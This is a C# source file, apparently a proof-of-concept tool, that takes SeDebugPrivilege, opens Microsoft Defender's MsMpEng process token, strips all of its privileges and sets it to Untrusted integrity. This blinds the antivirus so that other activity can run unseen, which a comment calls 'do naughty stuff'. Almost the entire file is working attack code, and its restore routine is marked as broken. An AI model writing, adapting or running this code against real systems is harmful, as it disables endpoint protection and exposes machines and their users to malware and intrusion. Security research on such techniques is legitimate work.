using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

using static SandboxDefender.Native;

namespace SandboxDefender
{
    class Program
    {
        // this works for the poc, enumerating the current privileges would be a better solution
        private static string[] privs = new string[]
        {
            "SeAssignPrimaryTokenPrivilege",
            "SeBackupPrivilege",
            "SeDebugPrivilege",
            "SeChangeNotifyPrivilege",
            "SeImpersonatePrivilege",
            "SeIncreaseBasePriorityPrivilege",
            "SeIncreaseQuotaPrivilege",
            "SeLoadDriverPrivilege",
            "SeRestorePrivilege",
            "SeSecurityPrivilege",
            "SeShutdownPrivilege",
            "SeSystemEnvironmentPrivilege",
            "SeTakeOwnershipPrivilege",
            "SeTcbPrivilege"
        };

        static void Main(string[] args)
        {
            // handle for this processes token
            IntPtr hProcessToken = IntPtr.Zero;
            // handle for the Defender process
            IntPtr hProcess = IntPtr.Zero;

            // get a handle to this process' token
            Console.WriteLine("[+] Getting a token handle for this process.");
            if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ALL_ACCESS, out IntPtr hTokenHandle))
                return;

            Console.WriteLine("[+] Token handle: 0x{0}", hTokenHandle.ToString("X"));

            // enable the SeDebugPriv
            Console.WriteLine("[+] Enabling SeDebugPrivilege.");
            if (!SetPrivilege(hTokenHandle, "SeDebugPrivilege"))
            {
                Console.WriteLine("[!] Unable to enable the SeDebugPrivilege, check that you have this privilege!");
                return;
            }

            Console.WriteLine("[+] SeDebugPrivilege enabled.");

            // break defender
            SandboxDefender();

            // do naughty stuff

            // fix defender - TODO fix codez! xD
            SandboxDefender(true);

            Console.WriteLine("[+] Done... Have a nice day!");
        }

        static private bool SandboxDefender(bool fix = false)
        {
            IntPtr hProcess = IntPtr.Zero;

            // get a handle to the Defender process - remember we must be able to enable the SeDebugPrivilege
            try
            {
                // first get the pid
                int pid = Process.GetProcessesByName("MsMpEng")[0].Id;
                Console.WriteLine("[+] Defender PID: {0}", pid);

                // we have to use the Win32 API, using .Net throws an exception as we can't use PROCESS_QUERY_LIMITED_INFORMATION
                Console.WriteLine("[+] Getting a process handle for Defender.");
                hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);

                // throw a general exception which will get caught below
                if (hProcess == IntPtr.Zero)
                    throw new Exception();

                Console.WriteLine("[+] Process handle: 0x{0}", hProcess.ToString("X"));
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Unable to get a handle to the process, check you have the correct privileges!");
                Console.WriteLine("[!] {0}", ex.Message);
                return false;
            }

            // get a handle to this process' token
            Console.WriteLine("[+] Getting a token handle for the Defender process.");
            if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, out IntPtr hTokenHandle))
            {
                Console.WriteLine("[!] Unable to get a handle to the process token, ffs!");
                return false;
            }

            Console.WriteLine("[+] Token handle: 0x{0}", hTokenHandle.ToString("X"));

            if (!fix)
            {
                // break defender
                Console.WriteLine("[+] Will disable Defender privileges.");

                for (int i = 0; i < privs.Length; i++)
                {
                    if (!SetPrivilege(hTokenHandle, privs[i], false))
                    {
                        Console.WriteLine("[!] Unable to disable {0}!", privs[i]);
                    }
                }

                Console.WriteLine("[+] Will set Defender Integrity to Untrusted.");
                if (!SetIntegrity(hTokenHandle, ML_UNTRUSTED))
                {
                    Console.WriteLine("[!] Unable to set integrity to Untrusted!");
                }
            }
            else
            {
                // fix defender
                // TODO - this does not work - ERROR_TOKEN_ALREADY_IN_USE
                Console.WriteLine("[+] Will enable Defender privileges.");

                for (int i = 0; i < privs.Length; i++)
                {
                    if (!SetPrivilege(hTokenHandle, privs[i]))
                    {
                        Console.WriteLine("[!] Unable to disable {0}!", privs[i]);
                    }
                }

                Console.WriteLine("[+] Will set Defender Integrity to System.");
                if (!SetIntegrity(hTokenHandle, ML_SYSTEM))
                {
                    Console.WriteLine("[!] Unable to set integrity to System!");
                }
            }

            return true;
        }

        static bool SetPrivilege(IntPtr hToken, string privilege, bool enable=true)
        {
            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
            LUID lpLuid = new LUID();

            if(!LookupPrivilegeValue(string.Empty, privilege, ref lpLuid))
                return false;

            tp.PrivilegeCount = 1;
            tp.Privileges = new LUID_AND_ATTRIBUTES[1];
            tp.Privileges[0].Luid = lpLuid;

            if (enable)
                tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            else
                tp.Privileges[0].Attributes = SE_PRIVILEGE_DISABLED;

            if(!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
                return false;
            
            if(GetLastError() == ERROR_NOT_ALL_ASSIGNED)
                return false;

            return true;
        }

        static bool SetIntegrity(IntPtr hToken, string integrity)
        {
            TOKEN_MANDATORY_LABEL tml = default;
            tml.Label.Sid = IntPtr.Zero;
            tml.Label.Attributes = SE_GROUP_INTEGRITY;
            tml.Label.Sid = IntPtr.Zero;

            ConvertStringSidToSid(integrity, out tml.Label.Sid);

            IntPtr tmlPtr = Marshal.AllocHGlobal(Marshal.SizeOf(tml));
            Marshal.StructureToPtr(tml, tmlPtr, false);

            if(!SetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, tmlPtr, (uint)Marshal.SizeOf(tml)))
            {
                return false;
            }

            return true;
        }
    }
}
